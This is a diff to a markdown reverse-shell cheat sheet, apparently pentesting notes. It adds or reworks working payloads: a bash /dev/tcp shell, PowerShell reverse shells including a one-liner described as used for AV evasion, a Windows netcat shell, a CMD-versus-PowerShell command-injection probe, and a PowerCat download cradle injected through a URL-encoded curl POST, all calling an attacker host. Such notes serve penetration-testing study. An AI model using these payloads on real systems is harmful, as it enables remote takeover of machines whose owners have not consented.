@@ -22,7 +22,7 @@ These ports are more likely to be allowed by firewalls.
 #### 1. Bash Reverse Shell
 
 ```bash
-bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
+bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"
 ```
 
 #### 2. Python Reverse Shell
@@ -87,9 +87,11 @@ if(isset($_GET['cmd']))
 
 ---
 
-### Windows Reverse Shells
+## Windows Reverse Shells
 
-#### 1. PowerShell Reverse Shell (standard)
+### PowerShell Reverse Shell (Standard)
+
+A full PowerShell reverse shell can be used when we have command execution and want an interactive session:
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<ATTACKER_PORT>);
@@ -105,25 +107,61 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 }
 ```
 
----
+#### PowerShell Reverse Shell (One-liner)
 
-#### 2. PowerShell Reverse Shell (one‑liner, stealthier)
+More compact and commonly used in real scenarios:
 
-```powershell
+```bash
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<ATTACKER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-Commonly used for **AV evasion**
+Used frequently for AV evasion due to its inline execution.
 
----
-
-#### 3. Netcat Reverse Shell (Windows)
+#### Netcat Reverse Shell (Windows)
 
 ```bash
 nc.exe -e cmd.exe <ATTACKER_IP> <ATTACKER_PORT>
 ```
 
-Requires `nc.exe` to be uploaded to the target.
+Requires `nc.exe` to be present on the target.
+
+
+#### Detecting Execution Context (CMD vs PowerShell)
+
+When exploiting command injection, it is critical to know which interpreter is used.
+
+```bash
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+- Outputs `CMD` → running in CMD
+    
+- Outputs `PowerShell` → running in PowerShell
+    
+
+
+```bash
+curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>/archive
+```
+
+This allows adapting payloads depending on the backend.
+
+#### Reverse Shell via PowerCat (Download Cradle)
+
+If PowerShell is available, a more reliable method is to load an external tool like **PowerCat**.
+
+```bash
+# Step 1: Serve PowerCat
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+python3 -m http.server 80
+# Step 2: Start Listener
+nc -nvlp 4444
+# Step 3: Inject Reverse Shell
+IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p 4444 -e powershell
+# Step 4: Exploit via HTTP
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%204444%20-e%20powershell' http://<target>/archive
+```
+
 
 ---
 
